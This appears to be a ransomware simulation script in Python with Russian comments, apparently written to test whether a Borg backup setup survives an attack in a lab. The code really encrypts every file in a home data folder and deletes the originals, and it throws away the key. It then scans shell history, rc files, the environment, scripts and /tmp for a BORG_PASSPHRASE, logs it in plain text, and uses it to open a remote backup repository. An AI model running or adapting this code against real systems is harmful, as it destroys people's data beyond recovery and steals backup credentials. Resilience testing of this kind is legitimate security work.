#!/usr/bin/env python3
import os, subprocess, logging, re
from pathlib import Path
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('/tmp/sim_e.log'),
              logging.StreamHandler()])
log = logging.getLogger(__name__)
KEY = Fernet.generate_key()
CIPHER = Fernet(KEY)

def encrypt_file(f):
    try:
        data = open(f,'rb').read()
        open(str(f)+'.locked','wb').write(CIPHER.encrypt(data))
        os.remove(f); return True
    except: return False

# Шаг 1: шифруем файлы жертвы
target = Path(os.path.expanduser('~/important_data'))
enc = sum(1 for f in target.rglob('*')
          if f.is_file() and not str(f).endswith('.locked')
          and encrypt_file(f))
log.info(f'Victim files encrypted: {enc}')

# Шаг 2: ищем пароль в доступных местах
log.info('=== Searching for BORG_PASSPHRASE ===')
passphrase = None

# Место 1: bash_history
history = Path.home() / '.bash_history'
if history.exists():
    content = history.read_text(errors='ignore')
    match = re.search(r"BORG_PASSPHRASE='([^']+)'", content)
    if match:
        passphrase = match.group(1)
        log.warning(f'PASSPHRASE FOUND in {history}: {passphrase}')
    else:
        log.info(f'Not found in {history}')

# Место 2: .bashrc и .bash_profile
for rc in ['.bashrc', '.bash_profile', '.profile']:
    rc_file = Path.home() / rc
    if rc_file.exists() and not passphrase:
        content = rc_file.read_text(errors='ignore')
        match = re.search(r"BORG_PASSPHRASE='([^']+)'", content)
        if match:
            passphrase = match.group(1)
            log.warning(f'PASSPHRASE FOUND in {rc_file}: {passphrase}')
        else:
            log.info(f'Not found in {rc_file}')

# Место 3: переменные окружения
borg_env = os.environ.get('BORG_PASSPHRASE', None)
if borg_env and not passphrase:
    passphrase = borg_env
    log.warning(f'PASSPHRASE FOUND in environment: {passphrase}')
else:
    log.info('Not found in environment variables')

# Место 4: скрипты в домашней директории
if not passphrase:
    for script in Path.home().rglob('*.sh'):
        try:
            content = script.read_text(errors='ignore')
            match = re.search(r"BORG_PASSPHRASE='([^']+)'", content)
            if match:
                passphrase = match.group(1)
                log.warning(f'PASSPHRASE FOUND in script: {script}')
        except PermissionError:
            log.info(f'Cannot read (protected): {script}')

# Место 5: /tmp
if not passphrase:
    for f in Path('/tmp').glob('*'):
        try:
            if f.is_file():
                content = f.read_text(errors='ignore')
                match = re.search(r"BORG_PASSPHRASE='([^']+)'", content)
                if match:
                    passphrase = match.group(1)
                    log.warning(f'PASSPHRASE FOUND in /tmp/{f.name}: {passphrase}')
        except: pass
    if not passphrase:
        log.info('Not found in /tmp')

# Место 6: скрипт root (недоступен testuser)
root_script = Path('/usr/local/bin/remote_backup.sh')
if not passphrase:
    try:
        content = root_script.read_text()
        match = re.search(r"BORG_PASSPHRASE='([^']+)'", content)
        if match:
            passphrase = match.group(1)
            log.warning(f'PASSPHRASE FOUND in root script: {passphrase}')
    except PermissionError:
        log.info(f'PROTECTED: cannot read {root_script} (Permission denied)')

# Шаг 3: используем пароль если нашли
if passphrase:
    log.warning('=== PASSPHRASE FOUND — attempting repository access ===')
    env = {**os.environ,
           'BORG_PASSPHRASE': passphrase,
           'BORG_RSH': 'ssh -i /home/testuser/.ssh/backup_key'}
    r = subprocess.run(
        ['borg', 'list', 'borguser@192.168.56.20:/store/borg_remote'],
        env=env, capture_output=True, text=True)
    if r.returncode == 0:
        log.warning('REPOSITORY ACCESS GAINED — backups compromised!')
        log.warning(f'Available archives:\n{r.stdout}')
    else:
        log.info(f'Repository access failed: {r.stderr[:100]}')
else:
    log.info('=== PASSPHRASE NOT FOUND — repository access impossible ===')
    log.info('Backup repository remains secure')

log.info('=== SEARCH COMPLETE ===')
